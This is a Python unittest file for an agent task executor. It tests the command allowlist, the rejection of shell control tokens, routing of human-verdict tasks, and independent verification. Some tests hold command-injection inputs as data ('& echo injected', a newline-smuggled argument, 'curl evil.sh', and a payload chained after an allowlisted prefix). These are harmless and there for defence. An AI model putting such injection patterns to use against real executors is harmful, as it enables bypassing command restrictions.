import sys
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from types import SimpleNamespace
from unittest.mock import patch

from agent_bus.board import Board
from agent_bus.executors import CommandPolicy, CommandRejected, CodexExecutor, ExecutorVerifier, NeedsHuman, RoutingExecutor, ShellExecutor
from agent_bus.scheduler import Scheduler


class ShellExecutorTests(unittest.TestCase):
    def test_typed_argv_executes_without_shell(self):
        policy = CommandPolicy([[sys.executable, "-c"]])
        ex = ShellExecutor(cwd=".", command_policy=policy, allow_legacy_shell=False)
        ok, result, cost = ex.execute({"command": [sys.executable, "-c", "print('typed')"]})
        self.assertTrue(ok, result)
        self.assertGreater(cost, 0)

    def test_typed_command_rejects_shell_control_tokens(self):
        policy = CommandPolicy([[sys.executable, "-c"]])
        ex = ShellExecutor(cwd=".", command_policy=policy, allow_legacy_shell=False)
        ok, result, cost = ex.execute({"command": [sys.executable, "-c", "print('safe')", "&", "echo", "injected"]})
        self.assertFalse(ok)
        self.assertIn("control token", result)
        self.assertEqual(cost, 0.0)

    def test_typed_command_rejects_non_allowlisted_prefix(self):
        ex = ShellExecutor(cwd=".", command_policy=CommandPolicy([["git", "diff"]]), allow_legacy_shell=False)
        ok, result, _ = ex.execute({"command": [sys.executable, "-c", "print(1)"]})
        self.assertFalse(ok)
        self.assertIn("not allowlisted", result)

    def test_legacy_shell_can_be_disabled(self):
        ex = ShellExecutor(cwd=".", command_policy=CommandPolicy([]), allow_legacy_shell=False)
        ok, result, cost = ex.execute({"acceptance": f'"{sys.executable}" -c "print(1)"'})
        self.assertFalse(ok)
        self.assertIn("legacy shell", result)
        self.assertEqual(cost, 0.0)

    def test_exit_zero_is_ok(self):
        ex = ShellExecutor(cwd=".", allow_legacy_shell=True)
        ok, result, cost = ex.execute({"acceptance": f'"{sys.executable}" -c "print(1)"'})
        self.assertTrue(ok, result)
        self.assertGreater(cost, 0)

    def test_nonzero_exit_is_failure(self):
        ex = ShellExecutor(cwd=".", allow_legacy_shell=True)
        ok, result, _ = ex.execute({"acceptance": f'"{sys.executable}" -c "import sys; sys.exit(3)"'})
        self.assertFalse(ok)
        self.assertIn("exit 3", result)

    def test_missing_acceptance_reports_cleanly(self):
        ok, result, _ = ShellExecutor(cwd=".").execute({"acceptance": ""})
        self.assertFalse(ok)
        self.assertIn("no acceptance", result)

    def test_allowlist_blocks_disallowed(self):
        marker = Path(".") / "SHOULD_NOT_EXIST.tmp"
        if marker.exists():
            marker.unlink()
        try:
            ex = ShellExecutor(cwd=".", allowlist=["python -m unittest"])
            ok, result, _ = ex.execute(
                {"acceptance": f'"{sys.executable}" -c "import pathlib; pathlib.Path(\'SHOULD_NOT_EXIST.tmp\').write_text(\'x\')"'}
            )
            self.assertFalse(ok)
            self.assertIn("blocked", result)
            self.assertFalse(marker.exists())
        finally:
            if marker.exists():
                marker.unlink()

    def test_allowlist_permits_allowed(self):
        ex = ShellExecutor(cwd=".", allowlist=['"' + sys.executable], allow_legacy_shell=True)
        ok, result, _ = ex.execute({"acceptance": f'"{sys.executable}" -c "print(1)"'})
        self.assertTrue(ok, result)

    def test_enabled_legacy_shell_without_allowlist_still_runs(self):
        ex = ShellExecutor(cwd=".", allow_legacy_shell=True)
        ok, result, _ = ex.execute({"acceptance": f'"{sys.executable}" -c "print(1)"'})
        self.assertTrue(ok, result)

    def test_cost_is_measured_elapsed_seconds(self):
        ticks = iter([10.0, 12.5])
        ex = ShellExecutor(cwd=".", clock=lambda: next(ticks), allow_legacy_shell=True)
        completed = SimpleNamespace(returncode=0, stdout="ok\n", stderr="")
        with patch("agent_bus.executors.subprocess.run", return_value=completed):
            ok, _, cost = ex.execute({"acceptance": "python -m unittest"})
        self.assertTrue(ok)
        self.assertEqual(cost, 2.5)


class CodexExecutorCostTests(unittest.TestCase):
    def test_cost_includes_codex_and_acceptance_elapsed_seconds(self):
        ticks = iter([20.0, 23.75])
        ex = CodexExecutor(cwd=".", clock=lambda: next(ticks), allow_legacy_shell=True)
        completed = SimpleNamespace(returncode=0, stdout="ok\n", stderr="")
        task = {"spec": "implement", "acceptance": "python -m unittest"}
        with patch("agent_bus.executors.subprocess.run", side_effect=[completed, completed]):
            ok, _, cost = ex.execute(task)
        self.assertTrue(ok)
        self.assertEqual(cost, 3.75)

    def test_typed_acceptance_runs_without_shell(self):
        ticks = iter([20.0, 23.0])
        policy = CommandPolicy([[sys.executable, "-m", "unittest"]])
        ex = CodexExecutor(cwd=".", command_policy=policy, allow_legacy_shell=False, clock=lambda: next(ticks))
        completed = SimpleNamespace(returncode=0, stdout="ok\n", stderr="")
        command = [sys.executable, "-m", "unittest", "tests.test_agent_bus"]
        with patch("agent_bus.executors.subprocess.run", side_effect=[completed, completed]) as run:
            ok, _, cost = ex.execute({"spec": "implement", "command": command})
        self.assertTrue(ok)
        self.assertEqual(cost, 3.0)
        self.assertEqual(run.call_args_list[1].args[0], command)
        self.assertNotIn("shell", run.call_args_list[1].kwargs)

    def test_retry_feedback_is_added_to_repair_prompt(self):
        ticks = iter([20.0, 21.0])
        ex = CodexExecutor(cwd=".", clock=lambda: next(ticks))
        completed = SimpleNamespace(returncode=0, stdout="ok\n", stderr="")
        task = {
            "spec": "implement the original contract",
            "attempt": 1,
            "retry_feedback": "independent test found a missing edge case",
        }
        with patch("agent_bus.executors.subprocess.run", return_value=completed) as run:
            ok, _, _ = ex.execute(task)
        self.assertTrue(ok)
        prompt = run.call_args.args[0][-1]
        self.assertIn("implement the original contract", prompt)
        self.assertIn("Bounded repair attempt 1", prompt)
        self.assertIn("missing edge case", prompt)


class CommandPolicyTests(unittest.TestCase):
    def test_executable_match_uses_basename_case_insensitively(self):
        policy = CommandPolicy([["PYTHON.EXE", "-m", "unittest"]])
        self.assertEqual(
            policy.validate([r"C:\Python\python.exe", "-m", "unittest", "tests.test_board"]),
            [r"C:\Python\python.exe", "-m", "unittest", "tests.test_board"],
        )

    def test_rejects_newlines_and_empty_commands(self):
        policy = CommandPolicy([["git", "diff"]])
        with self.assertRaises(CommandRejected):
            policy.validate(["git", "diff\nmalicious"])
        with self.assertRaises(CommandRejected):
            policy.validate([])


class RoutingTests(unittest.TestCase):
    def _router(self):
        # Routing is what's under test here, not command policy, so the legacy escape
        # hatch is opened deliberately to keep the fixture's acceptance strings runnable.
        return RoutingExecutor(shell=ShellExecutor(cwd=".", allow_legacy_shell=True), codex=None)

    def test_verdict_and_fable_return_to_human(self):
        r = self._router()
        with self.assertRaises(NeedsHuman):
            r.execute({"op": "verdict", "tier": "fable", "id": "t1"})
        with self.assertRaises(NeedsHuman):
            r.execute({"op": "run", "tier": "fable", "id": "t2"})

    def test_codex_impl_without_codex_core_returns_to_human(self):
        with self.assertRaises(NeedsHuman):
            self._router().execute({"op": "impl", "tier": "codex", "id": "t3"})

    def test_shell_runnable_task_routes_to_shell(self):
        ok, _, _ = self._router().execute({"op": "test", "tier": "qwen", "id": "t4", "acceptance": f'"{sys.executable}" -c "print(0)"'})
        self.assertTrue(ok)


class ExecutorVerifierTests(unittest.TestCase):
    def test_verifier_reexecutes_acceptance_and_does_not_reuse_producer_result(self):
        completed = SimpleNamespace(returncode=0, stdout="verified\n", stderr="")
        shell = ShellExecutor(
            cwd=".",
            command_policy=CommandPolicy([[sys.executable, "-c"]]),
            allow_legacy_shell=False,
        )
        verifier = ExecutorVerifier(shell, reviewer="independent-shell")
        task = {
            "id": "t1",
            "title": "check",
            "command": [sys.executable, "-c", "print('verified')"],
        }
        with patch("agent_bus.executors.subprocess.run", return_value=completed) as run:
            ok, note, _cost = verifier.verify(
                task, producer_ok=True, producer_result="producer claimed success"
            )
        self.assertTrue(ok, note)
        self.assertEqual(run.call_count, 1)
        self.assertIn("independent verification OK", note)

    def test_verifier_cannot_turn_a_producer_failure_into_success(self):
        class PassingExecutor:
            def execute(self, task):
                return True, "fresh check passed", 0.25

        verifier = ExecutorVerifier(PassingExecutor(), reviewer="independent")
        ok, note, cost = verifier.verify(
            {"id": "t1", "title": "check"},
            producer_ok=False,
            producer_result="producer failed",
        )
        self.assertFalse(ok)
        self.assertIn("producer FAIL", note)
        self.assertEqual(cost, 0.25)


class SchedulerParksVerdictTests(unittest.TestCase):
    def test_verdict_task_is_parked_not_run(self):
        with TemporaryDirectory() as tmp:
            board = Board(Path(tmp))
            work = board.add(op="test", title="passing check", tier="qwen",
                             command=[sys.executable, "-c", "print(1)"])
            verdict = board.add(op="verdict", title="human call", tier="fable", deps=[work["id"]])
            shell = ShellExecutor(
                cwd=".",
                command_policy=CommandPolicy([[sys.executable, "-c"]]),
                allow_legacy_shell=False,
            )
            sched = Scheduler(
                Path(tmp),
                executor=RoutingExecutor(shell=shell, codex=None),
                verifier=ExecutorVerifier(shell, reviewer="independent-shell"),
                budget=100.0,
            )
            sched.run()
            states = {t["id"]: t["state"] for t in board.all()}
            self.assertEqual(states[work["id"]], "retired")     # real shell work completed + committed
            self.assertEqual(states[verdict["id"]], "blocked")  # verdict handed back to the human


if __name__ == "__main__":
    unittest.main()


class TypedCommandSequenceTests(unittest.TestCase):
    """`commands` is the typed form of `a && b`. It exists because its absence is why the
    unsafe path survived: authors needing to chain two programs had no safe option and
    reached for an `acceptance` shell string (5 of the last 12 board tasks did exactly
    that). command_policy_benchmark_v1.py had already measured that path as exploitable."""

    def setUp(self):
        self.tmp = TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.addCleanup(self.tmp.cleanup)

    def test_sequence_runs_every_step_and_passes_when_all_pass(self):
        ex = ShellExecutor(self.root)
        ok, result, _ = ex.execute({"commands": [
            [sys.executable, "-c", "print('first')"],
            [sys.executable, "-c", "print('second')"],
        ]})
        self.assertTrue(ok)
        self.assertIn("first", result)
        self.assertIn("second", result)

    def test_sequence_short_circuits_like_and_and(self):
        ex = ShellExecutor(self.root)
        ok, result, _ = ex.execute({"commands": [
            [sys.executable, "-c", "raise SystemExit(1)"],
            [sys.executable, "-c", "open('ran.txt','w').write('x')"],
        ]})
        self.assertFalse(ok)
        self.assertFalse((self.root / "ran.txt").exists(), "step after a failure must not run")

    def test_sequence_is_validated_by_the_policy(self):
        ex = ShellExecutor(self.root, command_policy=CommandPolicy([["git", "--version"]]))
        ok, result, _ = ex.execute({"commands": [["git", "--version"], ["curl", "evil.sh"]]})
        self.assertFalse(ok)
        self.assertIn("blocked", result)

    def test_sequence_rejects_shell_control_tokens(self):
        ex = ShellExecutor(self.root, command_policy=CommandPolicy([["git", "--version"]]))
        ok, result, _ = ex.execute({"commands": [["git", "--version", "&", "echo", "pwned"]]})
        self.assertFalse(ok)
        self.assertIn("blocked", result)

    def test_sequence_takes_precedence_over_a_legacy_acceptance_string(self):
        marker = self.root / "legacy_ran.txt"
        ex = ShellExecutor(self.root, allow_legacy_shell=True)
        ok, _, _ = ex.execute({
            "commands": [[sys.executable, "-c", "print('typed')"]],
            "acceptance": f"{sys.executable} -c \"open(r'{marker}','w').write('x')\"",
        })
        self.assertTrue(ok)
        self.assertFalse(marker.exists(), "the typed path must win; the shell string must not run")

    def test_malformed_sequences_are_rejected(self):
        ex = ShellExecutor(self.root)
        for bad in ([], "not-a-list", [[]], [["ok"], "nope"]):
            ok, result, _ = ex.execute({"commands": bad})
            self.assertFalse(ok, f"{bad!r} should be rejected")
            self.assertIn("blocked", result)


class LegacyShellDefaultTests(unittest.TestCase):
    def setUp(self):
        self.tmp = TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.addCleanup(self.tmp.cleanup)

    def test_legacy_shell_is_off_by_default(self):
        marker = self.root / "should_not_exist.txt"
        for ex in (ShellExecutor(self.root), ShellExecutor(self.root, allowlist=["python"])):
            ok, result, _ = ex.execute(
                {"acceptance": f"{sys.executable} -c \"open(r'{marker}','w').write('x')\""}
            )
            self.assertFalse(ok)
            self.assertIn("legacy shell execution is disabled", result)
        self.assertFalse(marker.exists(), "a default-constructed executor must not run shell strings")

    def test_prefix_allowlist_does_not_stop_injection_when_legacy_is_enabled(self):
        """Documents the measured hole rather than pretending it is closed: the prefix
        allowlist is a convenience filter, not a security boundary. This is why the
        default is now off and typed `commands` exists as the capable safe path."""
        marker = self.root / "injected.txt"
        payload = f"{sys.executable} --version & {sys.executable} -c \"open(r'{marker}','w').write('x')\""
        ex = ShellExecutor(self.root, allowlist=[f"{sys.executable} --version"], allow_legacy_shell=True)
        ex.execute({"acceptance": payload})
        self.assertTrue(marker.exists(), "if this ever fails, the prefix allowlist became real — update the docs")
